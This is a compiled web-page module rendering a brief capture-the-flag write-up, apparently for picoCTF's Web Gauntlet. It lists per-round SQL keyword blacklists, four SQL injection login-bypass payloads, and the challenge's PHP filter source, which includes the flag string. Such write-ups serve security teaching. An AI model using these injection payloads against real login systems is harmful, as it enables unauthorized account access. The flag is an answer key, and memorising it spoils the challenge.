import{_ as n,o as s,c as a,e as t}from"./app-R-nj5o9Q.js";const o={},p=t(`<h4 id="round1-or" tabindex="-1"><a class="header-anchor" href="#round1-or" aria-hidden="true">#</a> Round1: or</h4><h4 id="round2-or-and-like" tabindex="-1"><a class="header-anchor" href="#round2-or-and-like" aria-hidden="true">#</a> Round2: or and like = --</h4><h4 id="round3-or-and-like" tabindex="-1"><a class="header-anchor" href="#round3-or-and-like" aria-hidden="true">#</a> Round3: or and = like &gt; &lt; --</h4><h4 id="round4-or-and-like-admin" tabindex="-1"><a class="header-anchor" href="#round4-or-and-like-admin" aria-hidden="true">#</a> Round4: or and = like &gt; &lt; -- admin</h4><h4 id="round5-or-and-like-union-admin" tabindex="-1"><a class="header-anchor" href="#round5-or-and-like-union-admin" aria-hidden="true">#</a> Round5: or and = like &gt; &lt; -- union admin</h4><div class="language-txt line-numbers-mode" data-ext="txt"><pre class="language-txt"><code>user=admin&#39; /*
user=admin&#39;--+
user=admin&#39;;
user=ad&#39;||&#39;min&#39;;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;round&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;round&quot;</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token variable">$round</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;round&quot;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$view</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;PHP_SELF&quot;</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string double-quoted-string">&quot;/filter.php&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$round</span> <span class="token operator">===</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;or&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$view</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">&quot;Round1: &quot;</span><span class="token operator">.</span><span class="token function">implode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot; &quot;</span><span class="token punctuation">,</span> <span class="token variable">$filter</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">&quot;&lt;br/&gt;&quot;</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$round</span> <span class="token operator">===</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;or&quot;</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">&quot;and&quot;</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">&quot;like&quot;</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">&quot;=&quot;</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">&quot;--&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$view</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">&quot;Round2: &quot;</span><span class="token operator">.</span><span class="token function">implode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot; &quot;</span><span class="token punctuation">,</span> <span class="token variable">$filter</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">&quot;&lt;br/&gt;&quot;</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$round</span> <span class="token operator">===</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot; &quot;</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">&quot;or&quot;</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">&quot;and&quot;</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">&quot;=&quot;</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">&quot;like&quot;</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">&quot;&gt;&quot;</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">&quot;&lt;&quot;</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">&quot;--&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// $filter = array(&quot;or&quot;, &quot;and&quot;, &quot;=&quot;, &quot;like&quot;, &quot;union&quot;, &quot;select&quot;, &quot;insert&quot;, &quot;delete&quot;, &quot;if&quot;, &quot;else&quot;, &quot;true&quot;, &quot;false&quot;, &quot;admin&quot;);</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$view</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">&quot;Round3: &quot;</span><span class="token operator">.</span><span class="token function">implode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot; &quot;</span><span class="token punctuation">,</span> <span class="token variable">$filter</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">&quot;&lt;br/&gt;&quot;</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$round</span> <span class="token operator">===</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot; &quot;</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">&quot;or&quot;</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">&quot;and&quot;</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">&quot;=&quot;</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">&quot;like&quot;</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">&quot;&gt;&quot;</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">&quot;&lt;&quot;</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">&quot;--&quot;</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">&quot;admin&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// $filter = array(&quot; &quot;, &quot;/**/&quot;, &quot;--&quot;, &quot;or&quot;, &quot;and&quot;, &quot;=&quot;, &quot;like&quot;, &quot;union&quot;, &quot;select&quot;, &quot;insert&quot;, &quot;delete&quot;, &quot;if&quot;, &quot;else&quot;, &quot;true&quot;, &quot;false&quot;, &quot;admin&quot;);</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$view</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">&quot;Round4: &quot;</span><span class="token operator">.</span><span class="token function">implode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot; &quot;</span><span class="token punctuation">,</span> <span class="token variable">$filter</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">&quot;&lt;br/&gt;&quot;</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$round</span> <span class="token operator">===</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot; &quot;</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">&quot;or&quot;</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">&quot;and&quot;</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">&quot;=&quot;</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">&quot;like&quot;</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">&quot;&gt;&quot;</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">&quot;&lt;&quot;</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">&quot;--&quot;</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">&quot;union&quot;</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">&quot;admin&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// $filter = array(&quot;0&quot;, &quot;unhex&quot;, &quot;char&quot;, &quot;/*&quot;, &quot;*/&quot;, &quot;--&quot;, &quot;or&quot;, &quot;and&quot;, &quot;=&quot;, &quot;like&quot;, &quot;union&quot;, &quot;select&quot;, &quot;insert&quot;, &quot;delete&quot;, &quot;if&quot;, &quot;else&quot;, &quot;true&quot;, &quot;false&quot;, &quot;admin&quot;);</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$view</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">&quot;Round5: &quot;</span><span class="token operator">.</span><span class="token function">implode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot; &quot;</span><span class="token punctuation">,</span> <span class="token variable">$filter</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">&quot;&lt;br/&gt;&quot;</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$round</span> <span class="token operator">&gt;=</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$view</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;filter.php&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;round&quot;</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">// picoCTF{y0u_m4d3_1t_16f769e719ab9d3e310fd13dc1262ee1}</span>
<span class="token delimiter important">?&gt;</span></span> 
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,7),e=[p];function u(l,i){return s(),a("div",null,e)}const r=n(o,[["render",u],["__file","Web Gauntlet.html.vue"]]);export{r as default};
